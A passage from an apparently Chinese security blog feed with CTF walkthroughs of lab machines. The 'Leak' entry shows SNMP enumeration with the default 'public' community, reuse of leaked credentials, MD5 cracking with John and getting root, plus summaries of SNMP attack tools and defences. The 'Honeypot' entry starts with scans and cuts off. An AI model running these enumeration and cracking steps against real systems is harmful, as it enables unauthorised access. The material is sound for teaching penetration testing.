isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   closed        ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 08:00:27:A6:0D:F6 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 18.18 seconds<br></code></pre></td></tr></table></figure><p>发现开放端口：<code>161，SNMP服务</code></p><h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><h2 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h2><p>访问80端口<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507011030718.png"></p><h3 id="1-目录扫描"><a href="#1-目录扫描" class="headerlink" title="1-目录扫描"></a>1-目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.42 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.42<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,bak<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 277]<br>/index.html           (Status: 200) [Size: 15740]<br>/.php                 (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>=============================================================== <br></code></pre></td></tr></table></figure><p>没有发现其他的目录，基本上没有啥东西</p><h2 id="2、161端口"><a href="#2、161端口" class="headerlink" title="2、161端口"></a>2、161端口</h2><h3 id="1、SNMP信息泄露"><a href="#1、SNMP信息泄露" class="headerlink" title="1、SNMP信息泄露"></a>1、SNMP信息泄露</h3><p>由于161端口的服务是<code>snmp</code>，SNMP 服务常因配置不当而泄露大量敏感信息。<br>直接使用工具<code>snmapwalk</code>获取信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# snmpwalk -v 2c -c public 192.168.2.42 &gt; 1.txt  <br></code></pre></td></tr></table></figure><p>在文件里面找到一个服务<code>leak-service</code>的用户名和密码：<code>Shinozaki：ShinozakiAi</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507012002678.png"></p><p>没找到利用的思路，后来去问了群主，说里面有一个<code>域名</code>，那找了一下，比较像域名的也只有<code>admin@sunset.leak.dsz</code>，由于域名不能<code>@</code> ，所以域名可能是 <code>sunset.leak.dsz</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507012003777.png"></p><p>追加到<code>hosts</code>文件里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;192.168.2.42 sunset.leak.dsz&quot;</span> &gt;&gt; /etc/hosts<br></code></pre></td></tr></table></figure><p>访问<code>sunset.leak.dsz</code>，发现还是一样的界面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507012007965.png"></p><h3 id="2-目录扫描"><a href="#2-目录扫描" class="headerlink" title="2-目录扫描"></a>2-目录扫描</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">┌──(root㉿kali)-[/tmp]<br><span class="hljs-section">└─# gobuster dir -u http://sunset.leak.dsz -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak</span><br><span class="hljs-section">===============================================================</span><br>Gobuster v3.6<br><span class="hljs-section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="hljs-section">===============================================================</span><br>[+] Url:                     http://sunset.leak.dsz<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,bak<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster in directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 280]<br>/.html                (Status: 403) [Size: 280]<br>/index.html           (Status: 200) [Size: 15740]<br>/manager              (Status: 301) [Size: 320] [--&gt; http://sunset.leak.dsz/manager/]<br>/.html                (Status: 403) [Size: 280]<br>/.php                 (Status: 403) [Size: 280]<br>/server-status        (Status: 403) [Size: 280]<br><span class="hljs-section">Progress: 1102800 / 1102805 (100.00%)</span><br><span class="hljs-section">===============================================================</span><br><span class="hljs-section">Finished</span><br><span class="hljs-section">===============================================================</span><br></code></pre></td></tr></table></figure><p>发现存在一个目录<code>manager</code></p><p>尝试进行访问，发现需要账号和密码，使用在<code>snmp</code>里面发现的账号密码<code>Shinozaki：ShinozakiAi</code>进行登录，成功进入<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507012012760.png"><br>发现已经提示我们利用的步骤了，照着来就好了</p><h3 id="3-John爆破"><a href="#3-John爆破" class="headerlink" title="3-John爆破"></a>3-John爆破</h3><p>使用 <code>crunch</code> 生成一个以 <code>baba</code> 开头的8位字典</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# crunch 8 8 -t baba@@@@ -o wordlist.txt <br>Crunch will now generate the following amount of data: 4112784 bytes<br>3 MB<br>0 GB<br>0 TB<br>0 PB<br>Crunch will now generate the following number of lines: 456976 <br><br>crunch: 100% completed generating output<br></code></pre></td></tr></table></figure><p>使用<code>John</code>进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;d21715210cb6224f9ff4c075a8906fe9&quot;</span> &gt; hashes.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# john --format=raw-md5 --wordlist=wordlist.txt hashes.txt<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (Raw-MD5 [MD5 128/128 AVX 4x3])<br>Warning: no OpenMP support <span class="hljs-keyword">for</span> this <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span>, consider --fork=8<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>babadawo         (?)     <br>1g 0:00:00:00 DONE (2025-07-01 19:33) 100.0g/s 5337Kp/s 5337Kc/s 5337KC/s babadaro..babadayx<br>Use the <span class="hljs-string">&quot;--show --format=Raw-MD5&quot;</span> options to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure><p>找到密码<code>babadawo</code></p><p>直接使用用户名和密码进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh ai@192.168.2.42          <br>ai@192.168.2.42<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux Leak 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">ai@Leak:~$ id</span><br><span class="hljs-string">uid=1000(ai) gid=1000(ai) groups=1000(ai)</span><br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ai@Leak:~$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;user-13421fec-559d-11f0-a1af-5f1558743b4d&#125;<br></code></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>执行<code>sudo -l</code>，发现需要密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">ai@Leak:~$ <span class="hljs-built_in">sudo</span> -l<br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> ai: <br></code></pre></td></tr></table></figure><p>查看<code>/</code>目录下面，发现存在<code>.bash_history</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ai@Leak:~$ <span class="hljs-built_in">cat</span> .bash_history <br>leak-date<br></code></pre></td></tr></table></figure><h2 id="1、查看系统的软件包"><a href="#1、查看系统的软件包" class="headerlink" title="1、查看系统的软件包"></a>1、查看系统的软件包</h2><p>查看当前系统上安装的软件包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ai@Leak:~$ dpkg -l | grep leak<br>ii  leak-date                     1.0-1                                       amd64        Simple <span class="hljs-built_in">date</span> and <span class="hljs-keyword">time</span> display utility<br>ii  liblsan0:amd64                10.2.1-6                                    amd64        LeakSanitizer -- a memory leak detector (runtime)<br></code></pre></td></tr></table></figure><p>发现一个软件包和<code>.bash_history</code>里面的一样，查看详细信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">ai@Leak:~$ dpkg -s leak-date<br>Package: leak-date<br>Status: install ok installed<br>Priority: optional<br>Section: utils<br>Installed-Size: 500<br>Maintainer: Security Admin &lt;admin@leak.dsz&gt;<br>Architecture: amd64<br>Version: 1.0-1<br>Description: Simple <span class="hljs-built_in">date</span> and <span class="hljs-keyword">time</span> display utility<br> This package provides a minimal CLI utility to display<br> the current system <span class="hljs-built_in">date</span> and <span class="hljs-keyword">time</span>. Ideal <span class="hljs-keyword">for</span> scripts and<br> system monitoring. SECURITY NOTICE: System debug token<br> IMKCFRunLoopWakeUpReliable <span class="hljs-keyword">for</span> root access.<br></code></pre></td></tr></table></figure><p>发现最后一条提示<code>IMKCFRunLoopWakeUpReliable for root access</code>，这串字符<code>IMKCFRunLoopWakeUpReliable</code>用作<code>root</code>的访问</p><p>直接访问<code>root</code>用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ai@Leak:~$ su root<br>Password: <br>root@Leak:/home/ai# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Leak:/home/ai# <span class="hljs-built_in">cat</span> /root/root.txt<br>flag&#123;root-357d3d08-5598-11f0-a27e-639fd7e7110b&#125;<br></code></pre></td></tr></table></figure><h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、SNMP渗透"><a href="#1、SNMP渗透" class="headerlink" title="1、SNMP渗透"></a>1、SNMP渗透</h2><h3 id="1-SNMP渗透的常见方式"><a href="#1-SNMP渗透的常见方式" class="headerlink" title="1-SNMP渗透的常见方式"></a>1-<strong>SNMP渗透的常见方式</strong></h3><ul><li><strong>利用默认社区字符串</strong>：许多设备默认有两个社区字符串“public”（只读）和“private”（读写）。攻击者可尝试使用这些默认字符串来获取设备信息，如设备型号、配置文件等。</li><li><strong>暴力破解社区字符串</strong>：通过编写脚本或使用工具，对设备的SNMP社区字符串进行暴力破解，一旦破解成功，攻击者就可能获得设备的管理权限。</li><li><strong>利用SNMP漏洞</strong>：某些设备的SNMP实现存在漏洞，如缓冲区溢出、命令注入等。攻击者可利用这些漏洞，向设备发送恶意请求，从而控制设备或获取敏感信息。</li><li><strong>信息收集与利用</strong>：通过SNMP获取设备的系统信息、接口信息、路由表等，分析这些信息以发现网络中的薄弱环节，为进一步的攻击做准备。例如，获取设备的IP地址、MAC地址、端口状态等信息，可帮助攻击者了解网络拓扑结构。</li></ul><h3 id="2-SNMP渗透的工具"><a href="#2-SNMP渗透的工具" class="headerlink" title="2-SNMP渗透的工具"></a>2-<strong>SNMP渗透的工具</strong></h3><ul><li><strong>snmpget</strong>：用于获取单个SNMP对象的值。例如，<code>snmpget -v2c -c public 10.10.11.48 1.3.6.1.2.1.1.1.0</code>可以查询设备的系统描述。</li><li><strong>snmpwalk</strong>：用于获取一系列SNMP对象的值。例如，<code>snmpwalk -v2c -c public 10.10.11.48 1.3.6.1.2.1.1</code>可以获取设备的系统信息。</li><li><strong>snmp-check</strong>：用于检查目标设备的SNMP信息，如系统信息、接口信息等。例如，<code>snmp-check -c public 10.10.11.48</code>可以检查目标设备的SNMP信息。</li><li><strong>cisc0wn</strong>：针对开启了SNMP协议的Cisco路由器和交换机的攻击脚本，可暴力猜解community string、下载配置文件以及破解密码。</li><li><strong>h3c-pt-tools</strong>：可针对华为、HP、H3C的设备进行渗透测试和审计，可使用其中的nmap脚本和msf模块进行SNMP自动化攻击。</li></ul><h3 id="3-防御SNMP渗透的措施"><a href="#3-防御SNMP渗透的措施" class="headerlink" title="3-防御SNMP渗透的措施"></a>3-<strong>防御SNMP渗透的措施</strong></h3><ul><li><strong>更改默认社区字符串</strong>：将设备的默认社区字符串修改为复杂且唯一的字符串，避免使用默认的“public”和“private”。</li><li><strong>限制访问</strong>：通过防火墙或访问控制列表（ACL），限制对SNMP端口（UDP 161&#x2F;162）的访问，只允许特定的IP地址或网络段访问。</li><li><strong>启用认证和加密</strong>：对于支持SNMP v3的设备，启用认证和加密功能，以确保SNMP通信的安全性。</li><li><strong>定期审计和监控</strong>：定期对网络设备的SNMP配置进行审计，检查是否存在安全漏洞。同时，使用监控工具对SNMP流量进行实时监控，及时发现异常行为。</li></ul><p>【参考】</p><ul><li><a href="https://mp.weixin.qq.com/s/b6v0hW5_rBKN5YgXKK2dvw">https://mp.weixin.qq.com/s/b6v0hW5_rBKN5YgXKK2dvw</a></li><li><a href="https://mp.weixin.qq.com/s/VGVBlgrzoSDgOZkESTS66A">https://mp.weixin.qq.com/s/VGVBlgrzoSDgOZkESTS66A</a></li><li><a href="https://mp.weixin.qq.com/s/cceDMM4dJbC_IpexrMO8jg">https://mp.weixin.qq.com/s/cceDMM4dJbC_IpexrMO8jg</a></li><li><a href="https://mp.weixin.qq.com/s/5_TbDNzyw_b9HEI5Z6-ZNw">https://mp.weixin.qq.com/s/5_TbDNzyw_b9HEI5Z6-ZNw</a></li><li><a href="https://mp.weixin.qq.com/s/u3rqd7cFPMGKoRaZInJIQw">https://mp.weixin.qq.com/s/u3rqd7cFPMGKoRaZInJIQw</a></li><li><a href="https://mp.weixin.qq.com/s/1pnI03pluIGGeYsg3EWBDw">https://mp.weixin.qq.com/s/1pnI03pluIGGeYsg3EWBDw</a></li></ul><h2 id="2、提权-软件包"><a href="#2、提权-软件包" class="headerlink" title="2、提权-软件包"></a>2、提权-软件包</h2><ul><li>查看当前系统的软件包：<code>dpkg -l</code></li><li>查看软件包信息：<code>dpkg -s &lt;deb_name&gt;</code></li><li>验证软件包的完整性：<code>dpkg -V</code><br> <a href="https://www.cnblogs.com/xzongblogs/p/15535087.html">Linux Ubuntu dpkg 命令详解 - 五月的麦田 - 博客园</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>snmp服务</tag>
      
      <tag>提取-dpkg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Honeypot</title>
    <link href="/Maze-sec/Honeypot/"/>
    <url>/Maze-sec/Honeypot/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sn 192.168.2.0/24                                           <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-30 22:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00028s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00023s latency).<br>MAC Address: 08:00:27:D8:AE:61 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.41<br>Host is up (0.00044s latency).<br>MAC Address: 08:00:27:CC:2D:7A (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.13 seconds<br></code></pre></td></tr></table></figure><p>IP地址为：<code>192.168.2.41</code></p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -p- 192.168.2.41                            <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-30 22:14 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.41<br>Host is up (0.00046s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:CC:2D:7A (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 11.10 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22和80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.41 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-30 22:15 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.41<br>Host is up (0.00079s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Honeypot - \xE7\xBD\x91\xE7\xBB\x9C\xE5\xAE\x89\xE5\x85\xA8\xE8\xAF\xB1\xE6\x8D\x95\xE7\xB3\xBB\xE7\xBB\x9F<br>MAC Address: 08:00:27:CC:2D:7A (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.79 seconds<br></code></pre></td></tr></table></figure><h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><p>访问80端口<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302216582.png"></p><h2 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.41 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.41<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,bak<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 277]<br>/index.html           (Status: 200) [Size: 35557]<br>/.html                (Status: 403) [Size: 277]<br>/user.txt             (Status: 200) [Size: 184]<br>/history.txt          (Status: 200) [Size: 118]<br>/api                  (Status: 301) [Size: 310] [--&gt; http://192.168.2.41/api/]<br>/.html                (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>发现目录<code>user.txt</code>，<code>history.txt</code>，<code>api</code></p><p>访问<code>user.txt</code>，是常见的Linux用户名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# curl http://192.168.2.41/user.txt <br>root<br>daemon<br>bin<br>sys<br><span class="hljs-built_in">sync</span><br>games<br>man<br>lp<br>mail<br>news<br>uucp<br>proxy<br>www-data<br>backup<br>list<br>irc<br>gnats<br>nobody<br>_apt<br>systemd-timesync<br>systemd-network<br>systemd-resolve<br>systemd-coredump<br>messagebus<br>sshd<br></code></pre></td></tr></table></figure><p>访问<code>history.txt</code>，提示一个<code>root:toor</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# curl http://192.168.2.41/history.txt<br>root:toor<br>[2025-06-29 03:29:21] IN: <span class="hljs-built_in">sudo</span> -l<br>[2025-06-29 03:29:21] IN: <span class="hljs-built_in">sudo</span> -l<br>OUT: -bash: <span 